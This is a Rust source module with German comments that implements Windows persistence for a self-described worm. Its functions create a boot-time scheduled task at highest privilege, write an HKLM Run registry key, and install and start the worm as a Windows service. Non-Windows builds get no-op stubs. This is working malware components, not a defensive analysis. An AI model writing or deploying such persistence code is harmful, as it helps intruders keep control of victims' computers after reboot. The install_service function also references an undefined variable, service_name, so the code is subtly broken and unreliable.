//! Windows-Persistence: Scheduled Tasks, Registry-Run-Keys, Dienst-Installation.
//!
//! Stellt sicher, dass der Wurm nach Reboot weiterhin aktiv ist.
//! Auf Nicht-Windows-Plattformen sind die Funktionen als Stubs implementiert.

use tracing::debug;
#[cfg(target_os = "windows")]
use tracing::warn;

use kx_core::persist::Invocation;

use crate::error::WinError;

/// Erstelle eine Scheduled Task für automatische Ausführung beim Hochfahren.
///
/// # Argumente
/// * `task_name` — Name der Task (muss eindeutig sein)
/// * `executable` — Pfad zum auszuführenden Programm
/// * `arguments` — Optionale Argumente als String
///
/// # Rückgabe
/// Ok(()) bei Erfolg, ScheduledTask-Fehler sonst.
#[cfg(target_os = "windows")]
pub async fn create_scheduled_task(
    task_name: &str,
    executable: &str,
    arguments: &str,
) -> Result<(), WinError> {
    let schtasks = format!(
        "schtasks /Create /F /TN \"{task_name}\" /TR \"\"{executable}\" {arguments}\" /SC ONSTART /RL HIGHEST"
    );
    let output = tokio::process::Command::new("cmd.exe")
        .arg("/C")
        .arg(&schtasks)
        .output()
        .await
        .map_err(|e| WinError::ScheduledTask(e.to_string()))?;
    if !output.status.success() {
        let err = String::from_utf8_lossy(&output.stderr).to_string();
        warn!("schtasks fehlgeschlagen: {err}");
        return Err(WinError::ScheduledTask(err));
    }
    debug!("Scheduled Task {task_name} erstellt");
    Ok(())
}

/// Erzeuge einen Registry-Run-Key für automatische Ausführung.
///
/// Schreibt unter HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run.
/// Erfordert Administratorrechte.
#[cfg(target_os = "windows")]
pub async fn create_registry_run_key(name: &str, executable: &str) -> Result<(), WinError> {
    let reg = format!(
        "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v {name} /t REG_SZ /d \"{executable}\" /f"
    );
    let output = tokio::process::Command::new("cmd.exe")
        .arg("/C")
        .arg(&reg)
        .output()
        .await
        .map_err(|e| WinError::Registry(e.to_string()))?;
    if !output.status.success() {
        let err = String::from_utf8_lossy(&output.stderr).to_string();
        warn!("Registry-Run-Key fehlgeschlagen: {err}");
        return Err(WinError::Registry(err));
    }
    debug!("Registry-Run-Key {name} erstellt");
    Ok(())
}

/// Installiere den Wurm als Windows-Dienst.
///
/// Nutzt sc.exe für die Dienst-Registrierung. Der Dienst startet beim Hochfahren.
///
/// Die `binPath=`-Zeile trägt die **vollständige** Invocation: Binary und alle
/// Argumente. Ohne sie startet der Dienst nicht — die Pflichtargumente
/// `--start`, `--end` und `--server-cert` fehlen, und clap lehnt den Start ab.
/// Die Werte aus `env` sind unter Windows in der Befehlszeile aufgelöst
/// (`sc.exe` kennt keine Environment-Datei) — das Token steht damit in der
/// Prozessliste. Das ist eine Eigenheit von Windows-Diensten und keine
/// Besonderheit dieser Form.
#[cfg(target_os = "windows")]
pub async fn install_service(invocation: &Invocation, display_name: &str) -> Result<(), WinError> {
    let sc_create = kx_core::persist::windows_service_command(invocation, display_name);
    let output = tokio::process::Command::new("cmd.exe")
        .arg("/C")
        .arg(&sc_create)
        .output()
        .await
        .map_err(|e| WinError::Service(e.to_string()))?;
    if !output.status.success() {
        let err = String::from_utf8_lossy(&output.stderr).to_string();
        warn!("sc.exe create fehlgeschlagen: {err}");
        return Err(WinError::Service(err));
    }
    debug!("Dienst {service_name} installiert");
    Ok(())
}

/// Starte den installierten Dienst.
#[cfg(target_os = "windows")]
pub async fn start_service(service_name: &str) -> Result<(), WinError> {
    let output = tokio::process::Command::new("sc.exe")
        .args(["start", service_name])
        .output()
        .await
        .map_err(|e| WinError::Service(e.to_string()))?;
    if !output.status.success() {
        let err = String::from_utf8_lossy(&output.stderr).to_string();
        warn!("sc.exe start fehlgeschlagen: {err}");
        return Err(WinError::Service(err));
    }
    Ok(())
}

// --- Nicht-Windows-Plattformen: Stub-Implementierungen ---

/// Erstelle eine Scheduled Task (nur Windows).
#[cfg(not(target_os = "windows"))]
pub async fn create_scheduled_task(
    _task_name: &str,
    _executable: &str,
    _arguments: &str,
) -> Result<(), WinError> {
    debug!("Scheduled Tasks nur auf Windows verfügbar");
    Ok(())
}

/// Erzeuge einen Registry-Run-Key (nur Windows).
#[cfg(not(target_os = "windows"))]
pub async fn create_registry_run_key(_name: &str, _executable: &str) -> Result<(), WinError> {
    debug!("Registry-Run-Keys nur auf Windows verfügbar");
    Ok(())
}

/// Installiere den Wurm als Windows-Dienst (nur Windows).
#[cfg(not(target_os = "windows"))]
pub async fn install_service(
    _invocation: &Invocation,
    _display_name: &str,
) -> Result<(), WinError> {
    debug!("Windows-Dienste nur auf Windows verfügbar");
    Ok(())
}

/// Starte den installierten Dienst (nur Windows).
#[cfg(not(target_os = "windows"))]
pub async fn start_service(_service_name: &str) -> Result<(), WinError> {
    debug!("Windows-Dienste nur auf Windows verfügbar");
    Ok(())
}
